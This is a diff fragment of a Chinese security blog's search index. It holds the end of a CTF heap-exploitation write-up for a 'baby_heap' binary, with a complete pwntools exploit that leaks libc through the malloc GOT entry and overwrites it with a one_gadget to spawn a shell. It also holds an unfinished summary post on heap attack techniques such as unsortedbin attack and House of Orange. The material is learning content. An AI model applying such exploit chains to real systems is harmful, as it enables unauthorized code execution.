+<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
+<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="x03-一些问题">0x03 一些问题</h1>
+<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
+Q2：
+我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
+<h1 id="x04-完整exp">0x04 完整EXP</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+        <tag>Heap</tag>
       </tags>
   </entry>
   <entry>
@@ -1744,6 +1701,49 @@ true</p>
       </categories>
       <tags>
         <tag>SymbolicExecution</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Heap常规利用方式总结</title>
+    <url>/2023/09/22/blog7/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+大佬都有这种总结性的wp，那我也邯郸学步一下 :P
+</blockquote>
+<span id="more"></span>
+<h1 id="fastbin-attack">Fastbin Attack</h1>
+<h1 id="tcachebin-attack">Tcachebin Attack</h1>
+<h1 id="use-after-free">Use After Free</h1>
+<ul>
+<li><strong>概述</strong>
+在<code>free(chunk_ptr)</code>后并没有<code>chunk_ptr=0</code>，导致我们仍然能通过<code>chunk_ptr</code>对这个chunk进行修改</li>
+<li>Fastbin Attack</li>
+<li></li>
+</ul>
+<h1 id="unsortedbin-attack">Unsortedbin Attack</h1>
+<h3 id="概述">概述</h3>
+<p><code>Unsortedbin attack</code>分为<code>leak</code>和<code>write</code>两部分
+### Leak
+当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址<br />
+而这个地址可以用ida查看对应libc的malloc_trim函数找到<br />
+### write write是指
+此外，低libc版本的unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk
+- 申请fake_chunk <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**2.23版本**  </span><br><span class="line">- 初状态  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line">- 末状态  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure></p>
+<h1 id="houseoforange">HouseofOrange</h1>
+<h2 id="概述-1">概述</h2>
+<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。<br />
+## 伪造chunk需求 1. top_chunk的结束地址必须页对齐<br />
+-
+一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可<br />
+2. top_chunk.size &gt;= MINSIZE<br />
+3. top_chunk.size &lt; chunk_size + MINSIZE 4. top_chunk.prev_inuse == 1
+- 第一点中说的0xfe0要变为0xfe1</p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>Heap</tag>
+        <tag>Summary</tag>
       </tags>
   </entry>
 </search>
